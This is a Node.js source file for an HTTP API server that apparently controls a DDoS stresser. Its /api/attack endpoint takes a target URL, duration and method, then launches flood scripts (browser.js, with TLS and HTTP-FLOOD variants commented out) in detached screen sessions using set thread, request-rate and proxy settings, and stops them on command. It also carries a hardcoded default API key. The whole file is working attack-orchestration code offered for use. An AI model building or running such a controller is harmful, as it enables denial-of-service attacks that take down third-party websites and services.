const http = require('http');
const url = require('url');
const { spawn } = require('child_process');
const path = require('path');

const port = 3000;
const secretKey = 'mscjs-secret'; // Default key

/**
 * METHOD CONFIGURATION (JSON)
 * Edit this object to add or modify methods.
 * 
 * Structure:
 * "METHOD_NAME": {
 *    binary: "node", // or "./code", "python3", "go run", etc.
 *    script: "script_filename.js", // Optional, if binary needs a script file
 *    // Function to generate arguments array *after* the binary and script
 *    getArgs: (target, time, method) => [...] 
 * }
 */

// Global Settings (Non-API)
const SETTINGS = {
    threads: '10',
    rps: '100',
    ratelimit: '100',
    proxyFile: 'proxy.txt'
};

const METHODS_CONFIG = {
    "BROWSER": {
        binary: 'node',
        script: 'browser.js',
        getArgs: (target, time, method) => [target, time, SETTINGS.threads, SETTINGS.rps]
    },
    // Example for adding Symetric methods:
    // "TLS": {
    //     binary: 'node',
    //     script: 'symetric.js',
    //     getArgs: (target, time, method) => [method, target, time, SETTINGS.threads, SETTINGS.ratelimit, SETTINGS.proxyFile]
    // },
    // "HTTP-FLOOD": {
    //     binary: 'node',
    //     script: 'symetric.js',
    //     getArgs: (target, time, method) => [method, target, time, SETTINGS.threads, SETTINGS.ratelimit, SETTINGS.proxyFile]
    // }
};

const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);

    if (req.method === 'GET' && parsedUrl.pathname === '/api/attack') {
        const { apikey, target, time, method } = parsedUrl.query;

        // 1. Validate API Key
        if (apikey !== secretKey) {
            res.writeHead(403, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ status: 'error', message: 'Invalid API Key' }));
        }

        if (!target || !method) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ status: 'error', message: 'Missing parameters: target or method' }));
        }

        // Helper to get screen name from target
        const getScreenName = (targetUrl) => {
            let domain = 'target';
            try {
                const u = new URL(targetUrl);
                domain = u.hostname;
            } catch (e) {
                domain = targetUrl;
            }
            return `attack_${domain.replace(/[^a-zA-Z0-9.-]/g, '_')}`;
        };

        const methodKey = method.toUpperCase();
        const screenName = getScreenName(target);

        if (methodKey === 'STOP') {
            const stopArgs = ['-X', '-S', screenName, 'quit'];
            console.log(`[API] STOP Request -> Killing Screen Session: ${screenName}`);

            try {
                const child = spawn('screen', stopArgs, {
                    cwd: __dirname,
                    detached: true,
                    stdio: 'ignore'
                });
                child.unref();

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({
                    status: 'success',
                    message: 'Stop signal sent to attack session',
                    details: {
                        target,
                        screen_session: screenName,
                        command_executed: `screen ${stopArgs.join(' ')}`
                    }
                }));
            } catch (e) {
                console.error(e);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'error', message: 'Failed to execute stop command' }));
            }
            return;
        }

        const handler = METHODS_CONFIG[methodKey];

        if (!handler) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({
                status: 'error',
                message: `Invalid Method: '${method}'. Method is not defined in configuration.`,
                available_methods: Object.keys(METHODS_CONFIG)
            }));
        }

        if (!time) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ status: 'error', message: 'Missing parameter: time (required for starting attack)' }));
        }

        const methodArgs = handler.getArgs(target, time, method);

        const spawnArgs = ['-dmS', screenName, handler.binary];
        if (handler.script) {
            spawnArgs.push(handler.script);
        }
        spawnArgs.push(...methodArgs);

        console.log(`[API] Method: ${methodKey} -> Screen Session: ${screenName} -> Executing: ${handler.binary} ${handler.script || ''} ${methodArgs.join(' ')}`);

        try {
            const child = spawn('screen', spawnArgs, {
                cwd: __dirname,
                detached: true,
                stdio: 'ignore'
            });
            child.unref();

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                status: 'success',
                message: 'Attack initiated in background screen session',
                details: {
                    method: methodKey,
                    target,
                    time,
                    screen_session: screenName,
                    command_executed: `screen ${spawnArgs.join(' ')}`
                }
            }));
        } catch (e) {
            console.error(e);
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'error', message: 'Failed to spawn screen process' }));
        }

    } else {
        res.writeHead(404, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'error', message: 'Endpoint not found' }));
    }
});

server.listen(port, () => {
    console.log(`API Server listening on port ${port}`);
    console.log(`Usage: http://localhost:${port}/api/attack?apikey=${secretKey}&target=https://example.com&time=60&method=Browser`);
    console.log(`Stop:  http://localhost:${port}/api/attack?apikey=${secretKey}&target=https://example.com&method=STOP`);
});
